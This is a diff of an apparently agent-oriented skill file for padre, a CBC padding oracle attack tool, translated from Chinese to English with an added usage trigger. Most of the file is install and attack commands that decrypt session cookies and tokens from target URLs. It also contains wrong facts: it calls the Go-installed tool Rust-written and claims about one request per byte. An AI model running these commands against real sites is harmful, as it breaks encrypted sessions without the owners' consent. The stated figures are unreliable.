@@ -2,38 +2,42 @@
 name: padre-padding-oracle
 description: "CBC padding oracle plaintext recovery. Signals: cryptographic attack, encryption cracking, custom error detection, threads, plaintext output."
 zh-signals: "padre: CBC 填充预言爆破明文。信号:密码学攻击,加密破解,自定义错误判定,线程,输出明文。"
+when-to-use: >-
+  Use when you have a CBC-encrypted value and a detectable padding-oracle
+  error signal, and want to recover the plaintext byte by byte. Supports
+  custom error status codes, thread control, and output files.
 ---
 
 # padre
 
-- 攻击大类:C49 密码误用与协议分析
-- 上游仓库:https://github.com/glebarez/padre
-- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C49 Cryptographic Misuse and Protocol Analysis
+- Upstream Repository: https://github.com/glebarez/padre
+- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 go install github.com/glebarez/padre@latest
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `padre -u 'https://t.com/profile?token=MDEyMzQ1Njc4OQ=='` | Padding Oracle 攻击 |
-| `-u url -er 200 -or 403` | 自定义错误判定 |
-| `-t 20` | 线程 |
-| `-o out.txt` | 输出明文 |
+| `padre -u 'https://t.com/profile?token=MDEyMzQ1Njc4OQ=='` | Padding oracle attack |
+| `-u url -er 200 -or 403` | Custom error detection |
+| `-t 20` | Threads |
+| `-o out.txt` | Output plaintext |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### CBC 填充预言爆破明文
+### CBC padding oracle plaintext brute force
 
 ```bash
 padre -u 'https://t.com/login?session=iv+cipher_b64'
-# 每字节 ~1 次请求还原加密 cookie 明文
+# Roughly one request per byte recovers the plaintext of the encrypted cookie
 ```
 
-## 注意事项
+## Notes
 
-Rust 编写的高速 padding oracle 攻击工具,自动识别错误信号,字节级恢复 CBC 明文。
+High-speed padding oracle attack tool written in Rust; automatically detects the error signal and recovers CBC plaintext byte by byte.
